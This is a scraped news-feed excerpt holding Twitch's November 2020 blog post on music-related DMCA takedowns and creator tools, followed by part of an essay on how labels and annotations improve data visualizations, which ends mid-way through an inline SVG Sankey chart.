<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-i18n="ba2fc6a46b864e1cc0b2afadb1eff0cf-content">
    <p>Creators, we hear you. Your frustration and confusion with recent music-related copyright issues is completely justified. Things can–and should–be better for creators than they have been recently, and this post outlines our next steps to get there. Moving forward, we’ll be more transparent with what’s happening and what tools and resources we’re building to help.</p>

<p>Copyright law and the DMCA are not small or simple topics, so this won’t be a brief post. We’ll do our best to keep the legalese to a minimum, though there’s bound to be technical terms here and there.&nbsp;</p>

<h4 id="dmca-and-twitch"><strong>DMCA and Twitch</strong></h4>

<p>First off, a quick review of what DMCA actually is. The Digital Millennium Copyright Act (“DMCA”) is a set of US laws that allows you to create and share content on digital service providers like Twitch. We comply with the DMCA and similar laws worldwide. Part of complying means that when a copyright holder thinks a streamer has used their content without permission, we have a process in place for them to be able to request the content be taken down.</p>

<p>When we receive a DMCA notification, we process the notification in accordance with our <a href="https://www.twitch.tv/p/legal/dmca-guidelines/">DMCA Guidelines</a>. This includes removing the content, sharing the details with the channel owner, and tracking the allegation.&nbsp;</p>

<p>DMCA takedown notifications can affect your ability to stream because we, as part of our efforts to comply with the DMCA and similar global laws, issue and track copyright strikes and ban the accounts of those who repeatedly infringe the copyrights of others.&nbsp;</p>

<p>This policy is important because we respect the rights of all creators, including those who create or record music, as well as the rights of those who own and control copyrights. As a company that is built around a community of people who create content, we take allegations of copyright infringement seriously.&nbsp;</p>

<h4 id="recent-dmca-notifications"><strong>Recent DMCA notifications</strong></h4>

<p>How did we get to this moment? Until May of this year, streamers received <strong>fewer than 50 music-related DMCA notifications each year</strong> on Twitch. Beginning in May, however, representatives for the major record labels started sending <strong>thousands of DMCA notifications each week</strong> that targeted creators’ archives, mostly for snippets of tracks in years-old Clips. We continue to receive large batches of notifications, and we don’t expect that to slow down.&nbsp;</p>

<p>This means two things: 1) if you play recorded music on your stream, you need to stop doing that and 2) if you haven’t already, you should review your historical VODs and Clips that may have music in them and delete any archives that might.&nbsp;</p>

<p>We were as surprised by this sudden avalanche of notifications as many of you were. We also realized that we needed to provide streamers with more educational programs and content management tools to help you deal with this unprecedented number of notifications coming in all at once. So, while we continued to remove content targeted by these notifications as required by the DMCA, we understood VODs and Clips from years ago may not necessarily reflect your current approach to music. Therefore, we also paused the processing of strikes associated with these batched notifications in order to give you the tools, information, and time that you would need to deal with them.</p>

<p>We have analyzed the notifications we received during that period from the end of May through the middle of October. What we found is that more than 99% of the notifications were for tracks that streamers were playing in the background of their stream.&nbsp;</p>

<p>The point of the DMCA is to strike a balance between the interests of rights holders (the major record labels in this case) and creators. Because of this, we were compelled to delete the VODs and Clips that were identified in the notifications. This showed our commitment to upholding our obligations under the DMCA, while affording us the opportunity to sort out the best way to handle issuing strikes in these circumstances. Under these extraordinary circumstances, we recognized creators should have a reasonable chance to understand that content created in the past was being targeted as allegedly infringing and be given an opportunity to change their approach to music use before they got hit with strikes.</p>

<p>This led to the current situation, which is understandably frustrating and worrying for many of you. Given the circumstances, the warning email many of you received didn’t include all the information that you’d typically get in a DMCA notification (normally, when we receive a DMCA notification against your channel, we send you an email that includes information about the allegedly infringed work, who the claimant is, how the claimant can be contacted, and possible penalties under our repeat infringer policy, so that you can make an informed decision about whether to submit a counter notification or seek a retraction). We hear your feedback about how frustratingly little information we provided, and we should have made that warning email a lot more informative and helpful.</p>

<p>Over the last several months, we have done our best to manage this situation on behalf of both rights holders and creators. One of the mistakes we made was not building adequate tools to allow creators to manage their own VOD and Clip libraries. You’re rightly upset that the only option we provided was a mass deletion tool for Clips, and that we only gave you three-days notice to use this tool. We could have developed more sophisticated, user-friendly tools awhile ago. That we didn’t is on us. And we could have provided creators with a longer time period to address their VOD and Clip libraries – that was a miss as well. We’re truly sorry for these mistakes, and we’ll do better.</p>

<h4 id="how-to-avoid-dmca-notifications"><strong>How to avoid DMCA notifications&nbsp;</strong></h4>

<p>One important question we’ve heard from you is: how can I stream safely and confidently on Twitch without having to worry about getting DMCA notifications from music use?</p>

<p>Most importantly, <strong>don’t play recorded music in your stream</strong> unless you own all rights in the music, or you have the permission of the necessary rights holder(s). Doing this is the best protection for your streams going forward. If you’re unsure whether you own all the rights, it’s pretty likely you don’t. If you want to include recorded music in your stream, use a fully licensed alternative like Soundtrack by Twitch, or other rights cleared music libraries such as Soundstripe, Monstercat Gold, Chillhop, Epidemic Sound, and NCS.</p>

<p>While we haven’t received more than a handful of DMCA notifications targeting in-game music, if you’re playing games with recorded music in them, we recommend you review their End User License Agreements (that wall of text at the beginning of a game) to see how the terms cover streaming with that music. One way to do this is to search for a game’s official EULA online and then do a ctrl+f (Command+f on Mac) search for words like “stream,” “licensed,” and “music” to point you toward the correct sections. If you’re unsure about the rights, some games allow you to turn off music when streaming, or you can mute the game audio yourself. If neither of those apply, consider turning off VODs and Clips.&nbsp;</p>

<p>For your stream archives (VODs and Clips), right now your only options, if you think they contain unauthorized music, is to either go through them one by one, or, for Clips, use the “delete all” tool we’ve provided. We understand both of these options have downsides, and we’re working to provide you more and better options as soon as possible. These things will take time to get right, and new challenges may appear in the future. Regardless, we’re committing here and now to investing in building better tools and keeping you posted on our progress.</p>

<h4 id="new-products-and-tools"><strong>New products and tools</strong></h4>

<p>Ever since the influx of DMCA notifications began, we have been working on building new (and improving existing) tools to help creators (such as the Clips mass deletion tool). This work is still happening. Many of these changes won’t be visible to the community, but we’re focused on three areas where we heard you need more support from us:</p>

<p>First, you don’t have enough control over the recorded content on your channel. We have made improvements to enable you to mass delete Clips, but in addition, we will (1) expand the use of technology to detect copyrighted audio, and (2) give you more granular ways to manage your archive instead of just a “delete all” option.</p>

<p>Second, we’ll make it easier for you to control what audio from your live streams will show up in your recorded content. Soundtrack by Twitch has some of this technology built into it, and we’ll work to make it available for everyone regardless of whether you want to use Soundtrack, for which we’ve cleared all necessary rights, or music from others that provide rights-cleared music.</p>

<p>Third, we need to give you the ability to actually review your allegedly infringing content when you receive a DMCA notification, in addition to the details already provided in our takedown notifications - that is, information about what copyrighted work was allegedly infringed, who the claimant is, and how the claimant can be contacted. We also need to help you more easily file counter notifications if you believe you have the rights to use the content–for example, because you’ve secured a license, believe the use is a fair use,&nbsp; the claimant does not control the rights, or believe you have the right to use the music without permission.</p>

<p>Some of you have asked why we don’t have a license covering any and all uses of recorded music. We are actively speaking with the major record labels about potential approaches to additional licenses that would be appropriate for the Twitch service. That said, the current constructs for licenses that the record labels have with other services (which typically take a cut of revenue from creators for payment to record labels) make less sense for Twitch. The vast majority of our creators don’t have recorded music as a part of their streams, and the revenue implications to creators of …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/">https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/</a></em></p>]]>
            </description>
            <link>https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066598</guid>
            <pubDate>Thu, 12 Nov 2020 04:57:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Good Data Viz Is About the Small Things]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25066475">thread link</a>) | @tagawa
<br/>
November 11, 2020 | https://hamiltonulmer.com/notes/data-viz-small-things/ | <a href="https://web.archive.org/web/*/https://hamiltonulmer.com/notes/data-viz-small-things/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                
<main>
<article>
    <header>
      
        <p>data visualization</p>
        
      
    
      <p>It's all too common to fixate on the choice of data visualization method at the expense of the just-as-important small choices – labels, annotations, animation, and other bits you can add to tell the story better. That’s really where good data viz shines.</p>
    
    <dl>

      <dt>published</dt>
      <dd>Nov 11, 2020</dd>

      

      
        <dt>topics</dt>
        <dd>
          
            <a href="https://hamiltonulmer.com/topics/dataviz">dataviz</a>
          
            <a href="https://hamiltonulmer.com/topics/communication">communication</a>
          
            <a href="https://hamiltonulmer.com/topics/data%20science">data science</a>
          
        </dd>
      
    </dl>
    </header>
    <p>I recently consulted on an internal data visualization project at work, where someone asked this question: <em>“What's type of data graphic best shows this particular insight?”</em> I've been asked variations of this a lot over the years, and thought it might be better to just write an answer for posterity's sake.</p>
<p>In my experience, picking a data visualization method to convey some kind of insight is really the start of your journey, not the end. This is not to say that the choice isn’t important. There’s plenty of reading material on the internet that addresses the tradeoffs between, say, <a href="https://towardsdatascience.com/not-a-funnel-use-sankey-to-represent-your-sales-process-9621b6578c42">a funnel chart and a Sankey diagram</a>. It's just that fixating on the graphic type focuses the solution on a specific output, not a desired outcome. You have to go so much further.</p>

<p>To that end, I try to get others to reframe the question to this: <em>“how can this data visualization enable the reader to effortlessly see the story I see?”</em>. This question can change your tactics in profound ways. After all, getting someone to understand your viz requires you to practice basic reader empathy. Your readers don't always have the time, the context, nor the skills to uncover insights from the data on their own. Your job is to make it easy – hell, I'd say <em>trivial</em> – for them to reach that "aha!" moment, where their thinking changes and the possibilities open up.</p>

<p>When you shift your focus to <em>telling the story well</em>, you'll begin to understand why your work doesn't stop at picking a visualization method or graphic type, and what to do next. It's the <em>small things</em> that really make the story stick – labels, annotations, design choices, animations, mouse interactions, tooltips, data sources, documentation, and other extraneous details not always covered in your favorite data viz book.</p>
<p>The small things make the reader's journey possible. They're the contextual pieces needed to see the story clearly. They're the details that delight them into trusting your expertise; that one annotation that guides their attention; that helpful tooltip that explains a complicated metric; all the pre-empted answers to their immediate questions. Sometimes, they even make room for the reader to explore on their own.</p>
<p>Your graphic choice may point the reader in the right direction. It may even get them part-way there. But the road that leads them to that "aha!" moment is almost always paved with small things.</p>
<figure>
<p><a href="https://hamiltonulmer.com/img/road-dataviz.jpg">
<img src="https://hamiltonulmer.com/img/road-dataviz.jpg">
</a>
</p>
<figcaption>
  Ridge hiking near Muir Beach, San Francisco in the distance. 

</figcaption></figure>
<p>"Small" may not be the right word – not all of these things are visually small – but I think it works in this context. Juxtaposed with the "big" choice of graphic type, these other parts are seen as smaller and more numerous. This is probably why they're considered afterthoughts, if they're even considered at all. But without them, readers are liable to:</p>
<ul>
<li><strong>get lost</strong> – misinterpreting the visualization can push them to form the wrong conclusion or make the wrong decision.</li>
<li><strong>get stuck in the mud</strong> – they might fixate on a meaningless part of the visualization, assuming there is something important that isn't really there, without arriving at the core insight.</li>
<li><strong>give up and head elsewhere</strong> – if your data visualization is hard to understand, they may just give up, making a decision without any data.</li>
</ul>
<p>Building intuition about what small things to add is a byproduct of hands-on experience and relentless reader empathy. It requires putting a data visualization in front of someone and seeing them struggle to understand, and having the drive to understand and address their confusion and frustration. The more you do it, the easier it gets to anticipate the ways you can make your visual story clearer.</p>

<p>When a reader does truly understand the story, it's a rewarding experience. The insights will often lead to deeper, more interesting questions and explorations (I sometimes call this the <em>data viz happy path</em>). Isn't this the whole point of telling visual stories with data – helping others reach a new understanding?</p>
<p>It's not controversial to say that this idea – small details transforming a work from "meh" to "good" – is true in just about every communication medium. Small things reduce the cognitive load and make the medium itself disappear, leaving only the story. A great screenplay, an enthralling book, a song that grooves so well it can either fade into the setting or command your attention. "Good" work is not contructed by accident yet feels natural. And so it is with good data visualization. When it's really good, the graphic choices disappear, and the insights remain.</p>
<h3 id="an-example"><a href="#an-example">¶</a> An Example</h3>
<p>Let's see the difference between these two framings – <em>picking a graphic</em> vs. <em>telling the story well</em> –  through a practical example. Say you are fixated on “which graphic?” and pick a Sankey chart as a way of expressing some sort of user acquisition funnel for your company's newly-launched product, Sprockets Desktop. The software package you're using can easily express a series of state transitions as a static Sankey diagram, and you're surprised by how easy it is to get something together. You share the chart below with the product manager, who has never seen the acquisition funnel numbers before: <em>"Here's the acquisition funnel we talked about. Any thoughts?"</em></p>

<figure>

<figcaption>
  Stopping at "what graphic to use?"

</figcaption></figure>
<p>The response you get back from the very busy product manager is, well, terse:</p>

<blockquote>
<p><em>Looks good, thanks.<p>
– the PM</p></em></p>
</blockquote>
<p>You've reached a crucial moment. The product manager may never give you feedback on what's wrong, especially if they are not particularly data-savvy or don't have the time. But you can tell they're underwhelmed.</p>
<p>And this is where people sometimes screw it up. They assume it's because the visualization method isn't right. Before you change directions, let's say you prod this product manager for some real feedback. This encourages them to unleash a longer critique:</p>

<blockquote>
<p><em>What period of time is this chart for? These labels look like columns in a SQL resultset and I don't understand all of them. This Sankey chart gives me a good sense of the overall funnel dynamics but it's missing the numbers. Are these user states big or small in practice? I'd like to just SEE the numbers on the thing directly – there’s so much room available. This is for Sprockets Desktop, right? Why isn’t the title more descriptive? How do you define these different states? Can I get the raw data somehow? It's neat to see this funnel, but I'm struggling to understand it. Sorry, just being honest!<p>
– the PM</p></em></p>
</blockquote>
<p>Changing what type of graphic you use won't answer these questions. The reader didn't even criticize the choice of Sankey chart.</p>
<p>Now, let's say you shift your thinking from  <em>picking a graphic</em> to <em>telling the story well</em>, and add the small things they complained about:</p>
<figure>
  <div>
    <a href="https://hamiltonulmer.com/img/sankey-annotation.svg"><!--?xml version="1.0" encoding="UTF-8" standalone="no"?-->

<svg width="100%" viewBox="350 100 1020 475" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve" xmlns:serif="http://www.serif.com/" style="fill-rule:evenodd;clip-rule:evenodd;">
    <use xlink:href="#_Image1" x="366" y="308.577" width="237.942px" height="187.8px" transform="matrix(0.999756,0,0,0.998939,0,0)"></use>
    <use xlink:href="#_Image2" x="613.709" y="309.25" width="237.894px" height="127.972px" transform="matrix(0.999553,0,0,0.999779,0,0)"></use>
    <use xlink:href="#_Image3" x="861.72" y="293.8" width="237.796px" height="75.992px" transform="matrix(0.999145,0,0,0.9999,0,0)"></use>
    <use xlink:href="#_Image4" x="862.125" y="371.316" width="237.698px" height="30.788px" transform="matrix(0.998733,0,0,0.993152,0,0)"></use>
    <use xlink:href="#_Image5" x="1108.53" y="294.43" width="237.971px" height="61.826px" transform="matrix(0.999877,0,0,0.997191,0,0)"></use>
    <use xlink:href="#_Image6" x="1109.85" y="356.285" width="238.618px" height="29.857px" transform="matrix(0.998401,0,0,0.995235,0,0)"></use>
    <use xlink:href="#_Image7" x="1109.85" y="387.947" width="238.618px" height="40.569px" transform="matrix(0.998401,0,0,0.989495,0,0)"></use>
    <use xlink:href="#_Image8" x="1110.55" y="330.721" width="239.382px" height="79.74px" transform="matrix(0.997426,0,0,0.996748,0,0)"></use>
    <use xlink:href="#_Image9" x="366.112" y="184" width="980.45px" height="125.94px" transform="matrix(0.999439,0,0,0.999521,0,0)"></use>
    <use xlink:href="#_Image10" x="862.37" y="400.37" width="485.236px" height="71.658px" transform="matrix(0.998428,0,0,0.995255,0,0)"></use>
    <use xlink:href="#_Image11" x="613.795" y="436.307" width="732.691px" height="109.832px" transform="matrix(0.999578,0,0,0.998473,0,0)"></use>
    <rect x="356.132" y="190.476" width="10" height="296"></rect>
    <text x="372.132px" y="204.676px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">W<tspan x="385.093px 392.879px " y="204.676px 204.676px ">eb</tspan> Sessions</text>
    <text x="372.132px" y="220.676px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">100% (163,500)</text>
    <rect x="603.632" y="317.825" width="10" height="177.6"></rect>
    <text x="619.632px" y="332.025px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">Signups</text>
    <text x="619.632px" y="348.025px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">60% (98,100)</text>
    <rect x="851.132" y="310.11" width="10" height="118.4"></rect>
    <text x="867.132px" y="324.31px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">New Installs</text>
    <text x="867.132px" y="340.31px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">40% (65,400)</text>
    <rect x="1098.63" y="294.224" width="10" height="59.2"></rect>
    <text x="973.604px" y="308.424px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">Complete Proﬁles</text>
    <text x="1012.58px" y="324.424px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">20% (32,700)</text>
    <rect x="1098.63" y="369.424" width="10" height="29.6"></rect>
    <text x="982.935px" y="383.624px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">Skipped Proﬁles</text>
    <text x="1014.58px" y="399.624px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">10% (16,350)</text>
    <rect x="1346.13" y="319.288" width="10" height="50.32"></rect>
    <text x="1264.67px" y="333.488px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">Activations</text>
    <text x="1265.08px" y="349.488px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">17% (27,795)</text>
    <rect x="1346.13" y="385.608" width="10" height="38.48" style="fill:rgb(177,177,177);"></rect>
    <text x="1242.2px" y="399.808px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">Didn't Activate</text>
    <text x="1267.08px" y="415.808px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">13% (21,255)</text>
    <rect x="1346.13" y="184.888" width="10" height="118.4" style="fill:rgb(177,177,177);"></rect>
    <text x="1244.27px" y="199.088px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">Didn't Sign Up</text>
    <text x="1256.08px" y="215.088px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">40% (65,400)</text>
    <rect x="1346.13" y="440.088" width="10" height="29.6" style="fill:rgb(177,177,177);"></rect>
    <text x="1178.73px" y="454.288px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">Never Launched the App</text>
    <text x="1263.08px" y="470.288px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">10% (16,350)</text>
    <rect x="1346.13" y="485.688" width="10" height="59.2" style="fill:rgb(177,177,177);"></rect>
    <text x="1250.69px" y="499.888px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:14px;fill:var(--color--text);">Didn't Install</text>
    <text x="1260.08px" y="515.888px" style="font-family: var(--font--text), 'Arial', sans-serif;font-size:14px;fill:var(--color--text);">20% (32,700)</text>
    <circle cx="362" cy="525px" r="2" fill="gray"></circle>
    <line x1="362" x2="450" y1="525px" stroke-dasharray="4,1" y2="525px" fill="gray" opacity=".5" stroke="gray" marker-end="url(#arrow)"></line>
    <text x="460px" y="524px" dy=".35em" font-size="12" font-style="italic" fill="gray" text-anchor="start">funnel direction</text>
    <g transform="matrix(1,0,0,1,278.507,75.402)">
        <text x="81.948px" y="47.486px" style="font-family: var(--font--comment), 'Arial', sans-serif;font-size:16px; fill: var(--color--comment)">SPROCKETS DESKTOP</text>
        <text x="81.948px" y="72.271px" style="font-family: var(--font--text), 'Arial', sans-serif;font-weight:700;font-size:24px; fill:var(--color--text);">User Acquisition Journey</text>
        <text x="81.948px" y="93.729px" style="font-family: var(--font--comment), 'Arial', sans-serif; font-size:14px; fill:var(--color--comment)"><tspan style="font-style: italic">% of Web Sessions</tspan>, October 25th - October 31st, 2020</text>
            <text x="1075" y="50" text-anchor="end" font-size="12" style="font-family: var(--font--comment); fill: var(--color--link);">query</text>
            <text x="1075" y="75" text-anchor="end" font-size="12" style="font-family: var(--font--comment); fill: var(--color--link);">dataset</text>
    </g>
    <defs>
        <marker id="arrow" viewBox="0 0 10 10" refX="5" refY="5" markerWidth="5" markerHeight="5" orient="auto-start-reverse">
            <path d="M 0 0 L 10 5 L 0 10 z"></path>
        </marker>
        <image id="_Image1" width="238px" height="188px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAO4AAAC8CAYAAAB/qJLeAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAELklEQVR4nO3aTXLaWBiG0Y8fx7E7M6Y9yVZ6LZqxHs3YTW8lU8262k78Qw8sEgzGAUwDr31O1S2jaw8urnpAutKgabuvVXVVVfN+PC69PurxbDqZF/Bb46r6q6r+PPVCqqqatqt6HvVy2Pcr427LuV3n76rqfjadPPzPbxf2Nj71Al4w6Meqy2Muov8QWQ36R1V9r6rb/ufyeGnu57wPAg7pHMM9J+M60P+oabuHej3y1bnbqvq3qm76cetSggXhHs+oqq77sZem7RYR39TzqDcez6aT729bNudIuFmu+rG1pu0e63nQW0U/m07uDrdsDk2479+wqv7ox9b6U/udvt3r6Rv+/mArZyPhssmoqr70Y2sr1/K7XNM/m5tNJ48HeRfvlHA5tDdfy1dVNW13X+tB/6jD3fZbzD8kbvoJl3O12NHf6RR/H/1ZwqbQH+rEDya9cPyPcOHpLGFUR35W4A2+DU+9AmB3woVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAwoVAw/n8cXDqRQC7GQ4Gw/mpFwHsxqkyBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBIuBBpX1d9V9aWeIh4sjVMeD6tq1K9vdVz0v4MPa3DqBeyjabtBrYd9UZtD32b+oqo+VdXlyrg40tuCbX2LDPeYmrYb1nrMn/eYc5bAoQj3WJq2G9dTyNdVdbU0Xju+LsGzTrjnrmm7i3o97E2/s/H4fgn3vWra7lNtH/ni9ecK3ff4YITLL/2m32WtR7567f7adf346Av/eITLYTVtN6r9N/MW4S/v9LNOuJy3/oNgm1t8u9wO/N3fbnq+4FwIF3bR3x489YNKN/8BaBQxe31z5s0AAAAASUVORK5CYII="></image>
        <image id="_Image2" width="238px" height="128px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAO4AAACACAYAAAAMEFUIAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAC8UlEQVR4nO3YPW5aQQCF0YuD4yitm6wg+8he6FgPnZvsLg1tFPwDaXDkWGDg2QZf+xxpBBq9J81DfGKYUYA3ZTKbj5KMkpytXx+P1eh0y4PDTGbzsyTjJJ/Wrw/fPzU35PpNwTwc26J67j37+DXe80I4yGQ2P09ysWF82TL/cJxnc2Cs+TD4Z71F+5zdYe0z7OZekXDfgXVwLxHbxbHXzjDCPaH1f7Z9Ytq1vTw/9to5LeEOMJnNx3mZXzefP4O8my/OZDYfeoL4eG7bocrDcXakx4KNxpPZ/HuSr3nZI+1Dj8u3XXvI8T18GOMkP5J8O/VCgP3Z8kEh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UIh4UKZ1WopXGgzGp0JFxoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwqNT70AOIHbJHePXjfN3SVZJlkdMA69fsh9v4XLW7BM8ifJYsu4TnKT3aHtnLuaXt4d66Fek3B5jttsj+1+PBXkIsnivcR0TML9mK6zO7id42p6uTz6ykki3Db7RrXpV+56PX99Nb1cHX3lvCjhvr5VBmwfN4wbwXFPuP9bZfOhxm2Gxba4ml7eHPcR+AgODXfokfeQI/L7e5LDju+fc+LoPxsVxkl+rt9vjcgWDd6Wvyp5ER6r/UC5AAAAAElFTkSuQmCC"></image>
        <image id="_Image3" width="238px" height="76px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAO4AAABMCAYAAABqOovHAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADGElEQVR4nO3cX26iUBiH4R/WsXXi/Om4g9nObIM71sMde5qVMGrbpGpHmQtxShFUVDh88D4JQU/a5Nj0zSkHrScAlflhfCdpkDvyY3V9zdJr4DUCjfPD2JN0L+khdy57nB0b6Xg8rrv5M3Q8AeBAupqdiuvU2KfGJ94gwkVj/DAeSfqSOSa55/uxkas5WkG4uJofxvcqDjH/vNOrYJMIF6XS68SJpO/pURYlQTaMcHvOD+PP2kX5mDvvjzt3s0MZwu249M/YfYRFcXI9aRDhGueH8VCHYWYfj93NDnUh3Jbzw3gg6asOV8v9eeJudnCFcB3LbAAVrZaP2kXr+oY/WoZwa+aH8ViH9yq/iQ0gXIFwL5Tuxp66dzkRUaIGhJuRXk8+qPwNBBMRJFqgM+Gmu6uXvKc1O9aZnwe67aa/qOmKdeojSlU+2lQlvsEtXwvQZkM/jH9pt1lSNbaiMQANGEr6KemH64kAOB+rJGAQ4QIGES5gEOECBhEuYBDhAgYRLmAQ4QIGES5gEOECBhEuYBDhAgYRLmBMkmwJF7DG8waEC1hEuIBBhAsYRLiAQYQLGES4gEGECxhEuIBBhAsYRLiAQYQLGES4gEGECxg0SJKt6zkAqGjgeSy6gDVUCxhEuIBBhAsYRLiAQYQLGES4gEGECxhEuIBBhAsYRLiAQYQLGES4gEFD1xMAemYraZOes0d+7NjXLAgXfbOVtJS0ypxXJWMrvcdyTmxHA4yCaXKrF0G4sORN5wVXOhYF07/NT/v2CBeubSS9SHrOHEXPl1Ew5b8+pAgXddmoPML/z6Ng+upshoYRLi6xkTSXNEvPC+XCJMh6ES6KJNrFmI1zf55LernlRguqI9z+etZ7iPk4n7iebDfC7a5XFa+WM0mLruyu9hXh2rVW8Wo5kzSPguna4dxQM8Jtr/wG0Ic42fzpN8J1400fb5Fkb5OwAYSTCPe21jrv3iV/xuIqhHuefZDH3tlDkGhMH8Jd64L3tGbHomC6aX7aQLm2hJvo+CctLo1vxXUiumgo6beksa7/jOBF38eNfqC6f8+VOQrUh4p7AAAAAElFTkSuQmCC"></image>
        <image id="_Image4" width="238px" height="31px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAO4AAAAfCAYAAADgIPGeAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAyUlEQVR4nO3asQ3CUBBEwQVBRjH0QCu0RB1URkYGkkmIQYDF90oziaM7X/LkxKvj6bJPss1vpvL5Jdwwen4JN7TPz7nn1Y77JskhyW6GFwH/cV2PvgD4nHChkHChkHChkHChkHChkHChkHChkHChkHChkHChkHChkHChkHChkHChkHChkHChkHCh0DrJavQRwGd8caHPJFwoJFwoJFwoJFwoJFwoJFwoJFwoJFwotElyfj6/9eufV6Pnl3DD6Pkl3NA+P+eedztuD61fFUrO8zSAAAAAAElFTkSuQmCC"></image>
